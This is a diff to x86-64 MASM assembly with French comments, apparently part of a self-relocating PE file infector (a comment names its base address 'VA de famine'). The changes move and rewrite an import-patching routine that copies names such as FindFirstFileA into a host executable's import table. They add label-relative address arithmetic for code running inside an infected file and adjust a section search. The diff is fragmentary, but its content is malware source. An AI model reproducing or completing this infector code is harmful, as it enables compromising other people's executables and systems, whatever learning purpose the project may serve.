@@ -219,13 +219,6 @@ end_read_file:
 	test r13, qword ptr [rsp+48]
 	je ret_failure
 
-	mov rcx, qword ptr [rsp + 40]
-	mov rdx, r13
-	call init_imports ; On fait les imports
-
-	cmp rax, -1
-	je ret_failure
-
 	mov rax, qword ptr [rsp + 40]
 	add rax, 3Ch
 	xor rdx, rdx
@@ -273,6 +266,15 @@ end_read_file:
 	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
 	xor r10, r10
 	mov r10d, r8d
+
+	
+	mov rcx, qword ptr [rsp + 40]
+	mov rdx, r13
+	call init_imports ; On fait les imports
+
+	cmp rax, -1
+	je ret_failure
+
 
 	add rax, 4
 	mov rbx, r14
@@ -780,17 +782,6 @@ stop_ft_strequ_not_equal:
 	ret
 ft_strequ endp
 
-; rbp
-; 80 - 88	: Unused
-; 72 - 80	: FirstThunk
-; 64 - 72   : Virtual Address de idata
-; 56 - 64	: PointerToRawData de idata
-; 48 - 56	: tmp storage for rax
-; 40 - 48   : taille du fichier
-; 32 - 40	: void *fichier
-; 00 - 32	: shadow
-; rsp
-
 KERNEL_32_DLL_NAME db 'KERNEL32.dll',0h
 
 FindFirstFileA_NAME db 7dh, 01h, 'FindFirstFileA',0h
@@ -806,10 +797,30 @@ GetModuleFileNameA_NAME		db 75h, 02h, 'GetModuleFileNameA',0h
 
 COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12, 21, 00
 
+; rbp
+; 80 - 88	: Unused
+; 72 - 80	: FirstThunk
+; 64 - 72   : Virtual Address de idata
+; 56 - 64	: PointerToRawData de idata
+; 48 - 56	: tmp storage for rax
+; 40 - 48   : taille du fichier
+; 32 - 40	: void *fichier
+; 00 - 32	: shadow
+; rsp
+; r10d : VA de famine
+
 init_imports proc ; void init_imports(void *fichier)
+	push rbx
+	push rcx
+	push rdx
+	push r8
+	push r9
+	push rdi
+
 	push rbp
 	mov rbp, rsp
 	sub rsp, 88
+	push rax
 
 	mov qword ptr [rsp + 32], rcx ; on sauvegarde les parametres
 	
@@ -898,24 +909,23 @@ fin_boucle_init_imports_find_kernel32:
 	
 	mov qword ptr [rsp + 72], rax ; on sauvegarde l'adresse de la ft
 
-grande_boucle_init_imports:
-	add rcx, 2
-	cmp byte ptr [rcx], 0
-	je grande_boucle_init_imports_fin
-	inc rcx
-petite_boucle_init_imports:
-	inc rcx
-	cmp byte ptr [rcx - 1], 0
-	je grande_boucle_init_imports
-	jmp petite_boucle_init_imports
-
-grande_boucle_init_imports_fin:
+;grande_boucle_init_imports:
+;	add rcx, 2
+;	cmp byte ptr [rcx], 0
+;	je grande_boucle_init_imports_fin
+;	inc rcx
+;petite_boucle_init_imports:
+;	inc rcx
+;	cmp byte ptr [rcx - 1], 0
+;	je grande_boucle_init_imports
+;	jmp petite_boucle_init_imports
+;grande_boucle_init_imports_fin:
 
 
 	; Destination deja dans rcx la premiere fois
-	lea rdx, FindFirstFileA_NAME
-	mov r8, 151
-	call ft_memcpy
+;	lea rdx, FindFirstFileA_NAME
+;	mov r8, 151
+;	call ft_memcpy
 
 debut_boucle_oft_trouver_fin: ; RBX doit etre l'adresse de la premiere entree de l'oft
 	cmp dword ptr [rbx], 0
@@ -932,12 +942,16 @@ debut_boucle_ft_trouver_fin: ; RAX doit etre l'adresse de la premiere entree de 
 	jmp debut_boucle_ft_trouver_fin
 fin_boucle_ft_trouver_fin:
 
+	;add rcx, qword ptr [rsp + 64]
+	;sub rcx, qword ptr [rsp + 56]
+	;sub rcx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
+
+	lea rcx, FindFirstFileA_NAME
+	lea r8, label_debut
+	sub rcx, r8
+	add rcx, r10
+
 	lea r8, COUNT
-
-	add rcx, qword ptr [rsp + 64]
-	sub rcx, qword ptr [rsp + 56]
-	sub rcx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
-
 	
 	; rbx = fin oft
 	; rax = fin ft
@@ -967,11 +981,22 @@ fin_boucle_remplir_la_ft:
 	sub rax, qword ptr [rsp + 56]
 	sub rax, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
 	mov rdi, rax
-
+	pop rax
+	jmp fin_normale
 fin_error:
+	pop rax
+	mov rax, -1
 
+fin_normale:
 	mov rsp, rbp
 	pop rbp
+
+	pop rdi
+	pop r9
+	pop r8
+	pop rdx
+	pop rcx
+	pop rbx
 	ret
 
 init_imports endp
@@ -986,12 +1011,19 @@ init_imports endp
 ; rsp
 
 search_section proc
+
 	push rbp
+
 	push rbx
 	push r15
+	push r14
+	push r14
+
 	mov rbp, rsp
 	sub rsp, 16
+
 	xor rbx, rbx
+	xor r14, r14
 
 	mov dword ptr [rsp], 0
 	mov dword ptr [rsp + 8], 0
@@ -1020,6 +1052,9 @@ debut_boucle:
 	mov r15, qword ptr [SECTION_NAME]
 	cmp qword ptr [rax], r15
 	jne cpaca
+	add r14, 1
+	cmp r14, 2
+	jne cpaca
 	mov dword ptr [rsp], 0
 	mov dword ptr [rsp + 8], 0
 	jmp ret_func
@@ -1047,49 +1082,23 @@ fin_boucle:
 	jmp debut_boucle 
 
 ret_func:
+
+
 	mov ecx, dword ptr [rsp + 8]
 	mov edx, dword ptr [rsp]
 
 	mov rsp, rbp
+	
+	pop r14
+	pop r14
 	pop r15
 	pop rbx
 	pop rbp
+
+
 	ret
 search_section endp
 
-get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichier). Retourne VirtualAddress dans rcx, et PointerToRawData dans rdx
-	push rbp
-	push rbx
-	mov rbp, rsp
-	sub rsp, 32
-
-	call search_section
-	; sections = file header + sizeof(file_header) + SizeOfOptionalHeader
-	mov rax, rcx
-	add rax, 10h
-	xor rbx, rbx
-	mov bx, word ptr [rax]
-	add rax, rbx
-	add rax, 4
-debut_boucle_get_idata:
-	xor rbx, rbx
-	mov ebx, 00006174h
-	rol rbx, 32
-	mov rdx, rbx
-	mov ebx, 6164692eh
-	or	rbx, rdx
-	cmp qword ptr [rax], rbx
-	je	fin_boucle_get_idata
-	add rax, 28h
-	jmp	debut_boucle_get_idata
-fin_boucle_get_idata:
-	mov ecx, dword ptr [rax + 0ch]
-	mov edx, dword ptr [rax + 014h]
-	mov rsp, rbp
-	pop rbx
-	pop rbp
-	ret
-get_idata_values  endp
 
 label_fin:
 end
